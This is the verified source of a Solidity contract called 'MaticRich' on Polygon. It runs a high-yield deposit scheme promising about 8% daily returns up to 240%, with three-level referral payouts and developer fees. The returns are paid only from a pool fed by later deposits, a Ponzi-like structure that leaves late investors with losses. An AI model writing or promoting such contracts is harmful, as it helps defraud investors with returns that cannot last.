/**
 *Submitted for verification at polygonscan.com on 2022-03-26
*/

pragma solidity 0.5.10;

contract MaticRich {
    using SafeMath for uint;
    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 5 ether;
    uint constant public INVEST_MAX_AMOUNT = 5000 ether;
    uint constant public WITHDRAW_MIN_AMOUNT = 1 ether;
    uint constant public WITHDRAW_MAX_AMOUNT = 10000 ether;
    uint constant public WITHDRAW_RETURN = 1000;
    uint constant public BASE_PERCENT = 800;
    uint[] public REFERRAL_PERCENTS = [600, 400, 300];
    uint constant public DEV_FEE = 1000;
    uint constant public REINVEST_DEV_FEE = 800;
    uint constant public REINVEST_BONUS = 500;
    uint constant public MAX_HOLD_PERCENT = 200;
    uint constant public MAX_COMMUNITY_PERCENT = 100;
    uint constant public COMMUNITY_BONUS_STEP = 200;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 100000 ether;
    uint constant public MAX_CONTRACT_PERCENT = 100;
    uint constant public TIME_STEP = 1 days;

    address payable public devAddress;
    uint256 public startDate;

    uint public totalInvested;
    uint public totalUsers;
    uint public totalDeposits;
    uint public totalWithdrawn;
    uint public contractPercent;
    uint public totalRefBonus;
    
    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 start;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        uint256 checkpointWithdraw;
        uint256 checkpointReinvest;
        address referrer;
        uint256 bonus;
        uint256[3] refs;
    }

    mapping (address => User) internal users;
    event Newbie(address indexed user, address indexed parent);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable devAddr, uint256 start) public {
        require(!isContract(devAddr));
        devAddress = devAddr;
        contractPercent = getContractBalanceRate();

        if(start>0){
            startDate = start;
        }
        else{
            startDate = block.timestamp;
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    
    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = totalUsers.div(COMMUNITY_BONUS_STEP).mul(20);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }
    
    function withdraw() public {
        User storage user = users[msg.sender];

        require(user.checkpointWithdraw + TIME_STEP < block.timestamp , "withdraw allowed only once a day" );

        uint userPercentRate = getUserPercentRate(msg.sender);
        uint communityBonus = getCommunityBonusRate();

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(24).div(10)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(24).div(10)) {
                    dividends = (uint(user.deposits[i].amount).mul(24).div(10)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint256(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > WITHDRAW_MIN_AMOUNT, "Minimum Withdraw");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        if (WITHDRAW_MAX_AMOUNT < totalAmount) {
            totalAmount = WITHDRAW_MAX_AMOUNT;
        }
        
        user.checkpoint = block.timestamp;
        user.checkpointWithdraw = block.timestamp;

        totalAmount = totalAmount.sub(totalAmount.mul(WITHDRAW_RETURN).div(PERCENTS_DIVIDER));


        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);


        emit Withdrawn(msg.sender, totalAmount);
    }

    function quarter_withdraw() public {
        User storage user = users[msg.sender];

        require(user.checkpointWithdraw + TIME_STEP < block.timestamp , "withdraw allowed only once a day" );

        uint userPercentRate = getUserPercentRate(msg.sender);
        uint communityBonus = getCommunityBonusRate();

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(24).div(10)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(24).div(10)) {
                    dividends = (uint(user.deposits[i].amount).mul(24).div(10)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint256(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > WITHDRAW_MIN_AMOUNT, "Minimum Withdraw");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        if (WITHDRAW_MAX_AMOUNT < totalAmount) {
            totalAmount = WITHDRAW_MAX_AMOUNT;
        }
        
        user.checkpoint = block.timestamp;
        user.checkpointWithdraw = block.timestamp;

        totalAmount = totalAmount.sub(totalAmount.mul(WITHDRAW_RETURN).div(PERCENTS_DIVIDER));

        uint amountWd;
        uint amountReinvest;
        uint reinvestBonus;
        
        amountWd = totalAmount.mul(25).div(100);
        amountReinvest = totalAmount.mul(75).div(100);
        reinvestBonus = amountReinvest.mul(10).div(100);
        amountReinvest = amountReinvest.add(reinvestBonus);

        uint256 reinvest_dFee = amountReinvest.mul(REINVEST_DEV_FEE).div(PERCENTS_DIVIDER);
        devAddress.transfer(reinvest_dFee);
        emit FeePayed(msg.sender, reinvest_dFee);

        msg.sender.transfer(amountWd);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        user.deposits.push(Deposit(amountReinvest, 0, block.timestamp));
        totalInvested = totalInvested.add(amountReinvest);
        totalDeposits++;

        emit Withdrawn(msg.sender, totalAmount);
    }

    function half_withdraw() public {
        User storage user = users[msg.sender];

        require(user.checkpointWithdraw + TIME_STEP < block.timestamp , "withdraw allowed only once a day" );

        uint userPercentRate = getUserPercentRate(msg.sender);
        uint communityBonus = getCommunityBonusRate();

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(24).div(10)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(24).div(10)) {
                    dividends = (uint(user.deposits[i].amount).mul(24).div(10)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint256(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > WITHDRAW_MIN_AMOUNT, "Minimum Withdraw");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        if (WITHDRAW_MAX_AMOUNT < totalAmount) {
            totalAmount = WITHDRAW_MAX_AMOUNT;
        }
        
        user.checkpoint = block.timestamp;
        user.checkpointWithdraw = block.timestamp;

        totalAmount = totalAmount.sub(totalAmount.mul(WITHDRAW_RETURN).div(PERCENTS_DIVIDER));

        uint amountWd;
        uint amountReinvest;
        uint reinvestBonus;
        
        amountWd = totalAmount.mul(50).div(100);
        amountReinvest = totalAmount.mul(50).div(100);
        reinvestBonus = amountReinvest.mul(5).div(100);
        amountReinvest = amountReinvest.add(reinvestBonus);

        uint256 reinvest_dFee = amountReinvest.mul(REINVEST_DEV_FEE).div(PERCENTS_DIVIDER);
        devAddress.transfer(reinvest_dFee);
        emit FeePayed(msg.sender, reinvest_dFee);

        msg.sender.transfer(amountWd);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        user.deposits.push(Deposit(amountReinvest, 0, block.timestamp));
        totalInvested = totalInvested.add(amountReinvest);
        totalDeposits++;

        emit Withdrawn(msg.sender, totalAmount);
    }

    function getUserRates(address userAddress) public view returns (uint, uint, uint, uint) {
        User storage user = users[userAddress];

        uint timeMultiplier = 0;
        if (isActive(userAddress)) {
            timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(20);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
        }

        return (BASE_PERCENT, timeMultiplier, getCommunityBonusRate(), contractPercent);

    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(20);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);
        uint communityBonus = getCommunityBonusRate();

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(24).div(10)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(24).div(10)) {
                    dividends = (uint(user.deposits[i].amount).mul(24).div(10)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }
    
    function invest(address referrer) public payable {
        uint msgValue = msg.value;
        require(block.timestamp > startDate, "Contract does not launch yet");
        require(msgValue >= INVEST_MIN_AMOUNT, "Minimum Invest");
        require(msgValue <= INVEST_MAX_AMOUNT, "Maximum Invest");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");


        uint devFee = msgValue.mul(DEV_FEE).div(PERCENTS_DIVIDER);

        devAddress.transfer(devFee);

        emit FeePayed(msg.sender, devFee);

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint256(uint(users[upline].bonus).add(amount));
                        totalRefBonus = totalRefBonus.add(amount);
                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            totalUsers++;
            emit Newbie(msg.sender,user.referrer);
        }

        user.deposits.push(Deposit(msgValue, 0, block.timestamp));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msgValue);
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(24).div(10);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }
    
    function getUserCheckpoint(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserCheckpointWithdraw(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpointWithdraw;
    }

    function getUserCheckpointReinvest(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpointReinvest;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }
        return amount;
    }

    function getUserTotalActiveDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            if(uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(24).div(10)){
                amount = amount.add(uint(user.deposits[i].amount));
            }
        }
        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256 amount, uint256 withdrawn, uint256 start, uint256 finish) {
        User storage user = users[userAddress];

        amount = user.deposits[index].amount;
        withdrawn = user.deposits[index].withdrawn;
        start = user.deposits[index].start;
        finish = user.deposits[index].start+(30*TIME_STEP);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent, totalUsers);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint) {
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userActiveDeposit = getUserTotalActiveDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userAvailable, userDepsTotal, userActiveDeposit, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint256, uint256[3] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}